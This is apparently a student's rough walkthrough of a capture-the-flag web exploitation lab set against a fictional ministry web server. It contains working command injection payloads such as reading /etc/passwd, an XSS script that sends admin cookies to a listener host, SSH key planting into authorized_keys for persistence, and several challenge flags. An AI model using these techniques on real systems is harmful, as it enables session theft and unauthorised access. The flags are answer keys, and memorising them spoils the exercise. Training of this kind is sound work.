## Web Exploitation ##

Donovian Web Exploitation (DWE)
XX OCT 2023
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)

Objective: Maneuver through network, identify and gain access to Minstry of Industry web servers.

Tools/Techniques: All connections will be established through SSH masquerades or web browser. Ports in use will be dependent on target location and are subject to change. Web exploitation techniques limited to cross-site scripting, command injection, file upload, and path transversal. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = W3B3xpl01t5t@rt0F@ct1v1ty

Prior Approvals: Development of SSH access on host: Donovian_MI_websvr. Upon identification of additional Minstry web sites, student is authorized browse to pages to collect intellegence to enable answering CTFd challenges.

Scheme of Maneuver:
Jump Box
T1:10.100.28.40

>T1:10.100.28.40

Target Section:

T1
Hostname: Donovian_MI_websvr
IP: 10.100.28.40
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Conduct approved Web Exploitation techniques to collect intellegence.




2. Through website reconnaissance, what is Romanoff's email address? 
Step1: login to jumpbox: ssh@10.50.33.231 
Step2: create a local to T1 student@lin-ops:~$ ssh student@10.50.33.231 -L 50511:10.100.28.40:80 -NT 
Found following ports: PORT     STATE SERVICE 80/tcp   open  http 4444/tcp open  krb524 
Step 3: Create a dynamic to Jump box 
Step4: run –sV to confirm what services are running on it proxychains nmap -Pn -sV 10.100.28.40 
Step5 : Enumerate the website from ops station  student@lin-ps:~$ proxychains nmap -Pn -sT 10.100.28.40 -p 80 --script http-enum.nse
Found above directory Go to all the website I.e http://10.100.28.40/robots.txt There is another directory /net_test. Go to this directory: http://10.100.28.10/net_test Next: http://10.100.28.40/net_test/industry_check.php Next: ticket—we see can go to contract_bids.html


2. Natasha Romanoff has been identified as a major contracting officer for the Ministry. Intelligence suggests that she may have a file on system which will identify which companies are contracted to work on sensitive projects. Investigate Ministry website and identify vulnerabilities which could allow collection through usage of command injection, directory traversal, or unrestricted file upload  Step 1: Here we can see a section called system to ping. Lets check if this allows any pings. In system to ping: 8.8.8.8--- this verifies it does allow ping  Step2: Now to see if this allows any command injection to try few commands on on of the three boxes ; pwd ---- to see the current directory ---- var/www/html/net_test ; whoami – who is logged in --- billybob ; cat /etc/passwd --- to see the password of users  view source page

Found billybob and his current default directory: /bin/bash  And /home/billybob as the main directory ; ls -al /var/www/html --- to view other directories

### Establish a dynamic connection to the jumpbox ###

ssh into your jump box dynamically ->`ssh student@10.50.49.22 -D 9050`

### VIP email address 5 ###

Through website reconnaissance, what is Romanoff's email address?

##### Answer ####

1. use proxychains and nmap to scan for open ports using the given address
    -> `proxychains nmap -Pn --open 10.100.28.40`
2. wget on the http port-> `proxychains wget -r http://10.100.28.40:80`
3. Find out what's running on 4444:
    -> `proxychains nmap -p 4444 -sV 10.100.28.40`
    -> ssh is running on this port so you can ssh to this port 
4. Check the downloaded folder for the robots.txt to see what's allowed to run. 
    -> opening the http://10.100.28.40/net_test/ we see Parent Directory and industry_check.php
    -> Go to the industry_check.php
    -> Click troubleticket. 
    -> open contract_bids.html and your answer will be here 

### Stored Cross Site Scripting (XSS) 8 ###

Intel has found that by policy the Admin must check the Trouble Ticketing system every few minutes. Team lead orders are to "obtain" the Admins cookie.

##### Answer ####

1. Set your listening port with port of your own on the ops machine -> student@lin-ops:~$ nc -knvl 9696
2. Go to from industry check in VIP email address ->  http://10.100.28.40/TT/ticket.php
3. Edit your cross site scripting script to inject your code like below (use your jump-box's ip address):
    <script>document.location="http://10.50.39.223:9696/Cookie_Stealer1.php?username=" + document.cookie;</script>
4. The flag should be displayed from your listening port. 

### Command Injection 1 8 ###

Identify the user that the MI website is running as and relevant information about their user account configuration.

##### Answer ####

1. Go to the industry check page, has forms, that is most vulnerable -> http://10.100.28.40/net_test/industry_check.php
2. find out which of the pages can run commands e.g. ;whoami and look for the output. the second box lists billybob is the user. 
3. Path to test is identified. run 
4. Run `;cat /etc/passwd` to see the password of users 
5. View source page -> to the bottom of the page, you will see you "you found me and the flag .....7H0s83......."

### Basic HTTP Understanding 5 ###

Training Website

We have an asset that is trying to gain employment into the Ministry, however intelligence does not know the IP address of training web site. Our asset has stated that the training site may only be communicated with from the Ministry web site. We have reason to believe that the MI website might have a message saved inside the web server directory. Once we have located the address analyze that website and determine how to produce a certificate of completion, utilizing the Cyber Training Portal.

The flag will be dumped when successful

##### Answer ####

proxychains nmap -Pn -sT 10.100.28.40 -p 80 --script http-enum.nse

nmap ip 192.168.28.97-100, 100,105,111,120 -pm


2. Create a local tunnel to 10.100.28.40
    -> check if 4444 is an ssh port, `proxychains nmap -p 4444 -sV 10.100.28.40`
    -> `ssh student@10.50.49.22 -L 1222:10.100.28.40:4444`


3. Create a dynamic tunnel to the jumpbox 
    -> `ssh student@localhost -p 1222 -D 9050`
4. From running `proxychains nmap -Pn -sT 10.100.28.40 -p 80 --script http-enum.nse`
    -> Found

    PORT   STATE SERVICE
    80/tcp open  http
    | http-enum: 
    |   /robots.txt: Robots file
    |   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
    |   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
    |_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'


5. www-data:x:33:33:www-data:/var/www:/bin/bash -> The directory 
6. Find out where the pub directory is -> 


total 52 drwxr-xr-x 7 root root 4096 Apr 19 2022 . drwxrwxr-x 3 root www-data 4096 Apr 19 2022 .. -rw-r--r-- 1 root root 967 Mar 23 2022 Contract_bids.html drwxr-xr-x 2 root root 4096 Dec 13 11:12 TT drwxr-xr-x 2 root root 4096 Apr 19 2022 css -rw-r--r-- 1 root root 263 Mar 23 2022 db_recover.php -rw-r--r-- 1 root root 890 Mar 23 2022 fileUpload.php drwxr-xr-x 2 root root 4096 Apr 19 2022 images -rw-r--r-- 1 root root 2465 Mar 23 2022 index.html drwxr-xr-x 2 root root 4096 Apr 19 2022 net_test -rw-r--r-- 1 root root 34 Mar 23 2022 robots.txt -rw-r--r-- 1 root root 3280 Mar 23 2022 style.css drwxrwxrwx 2 root root 4096 Dec 14 18:15 uploads drwxrwxrwx 2 root root 4096 Dec 14 18:15 uploads


Found billybob and his current default directory: /bin/bash  And /home/billybob as the main directory ; ls -al /var/www/html --- to view other directories


my ssh keys: 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+ShHz+32iRy5PXvEQSEnn3yOK9azmn6tK+Ld8rpJkGg1Oyuq8hpq7YCmbS246hKLGytcqS9QKaC5xYojc/XjkdLzyAh8B1Ji2EPBMkVf2kpkXpS7uoYM0EvMm5j7Q2SakFdeDdLKgAUaY73JBkZmwSxi5GsJz6ZhE/x+92pFNDzcyXs4gyri+ME2ctmxVeSViOBtRONhjSrdTHePKekSPE4eKO4fEKrVFC8/QT7liTjNuCScNnw72TBys+4ZyrcSlj3yyEgs5Rrw3TpgkS+VS/tSpFf2lljuCmU0f/IXLW73q5/JdeiMEQqSFuV2SD2D9P+Eq92ES0HugQUz30yGR


; ls -la /home/billybob/.ssh/

mkdir /home/billybob/.ssh


;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+ShHz+32iRy5PXvEQSEnn3yOK9azmn6tK+Ld8rpJkGg1Oyuq8hpq7YCmbS246hKLGytcqS9QKaC5xYojc/XjkdLzyAh8B1Ji2EPBMkVf2kpkXpS7uoYM0EvMm5j7Q2SakFdeDdLKgAUaY73JBkZmwSxi5GsJz6ZhE/x+92pFNDzcyXs4gyri+ME2ctmxVeSViOBtRONhjSrdTHePKekSPE4eKO4fEKrVFC8/QT7liTjNuCScNnw72TBys+4ZyrcSlj3yyEgs5Rrw3TpgkS+VS/tSpFf2lljuCmU0f/IXLW73q5/JdeiMEQqSFuV2SD2D9P+Eq92ES0HugQUz30yGR" >> /home/billybob/.ssh/authorized_keys



 cat /home/billybob/.ssh/authorized_keys
PHPSESSID:"f2lh61den5tp2k8pvglcua4qii"

 <script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" + document.cookie;</script>



 Training Website

We have an asset that is trying to gain employment into the Ministry, however intelligence does not know the IP address of training web site. Our asset has stated that the training site may only be communicated with from the Ministry web site. We have reason to believe that the MI website might have a message saved inside the web server directory. Once we have located the address analyze that website and determine how to produce a certificate of completion, utilizing the Cyber Training Portal.

The flag will be dumped when successful

# Create a dynamic channel to spin this server up.... tunnel to 9050

10.100.28.55 

Go through the cyber awareness training.... open firefox to view the website.... 

Directory Traversal
5
Level II Challenge
Training Website

Having the ability to now communicate with the training web site, identify any vulnerabilities that could lead to intelligence collection.

Once identified utilize that vulnerability to obtain the flag from where information about user is configured on the system.

There's a form on this site 10.100.28.55 that'll help you answer


Command Injection 2 5

Level II Challenge
Natasha Romanoff has been identified as a major contracting officer for the Ministry. Intelligence suggests that she may have a file on system which will identify which companies are contracted to work on sensitive projects.

Investigate Ministry website and identify vulnerabilities which could allow collection through usage of command injection, directory traversal, or unrestricted file upload

Flag for Basic HTTP Understanding -> g91LjrKECe4IPR1hLRsG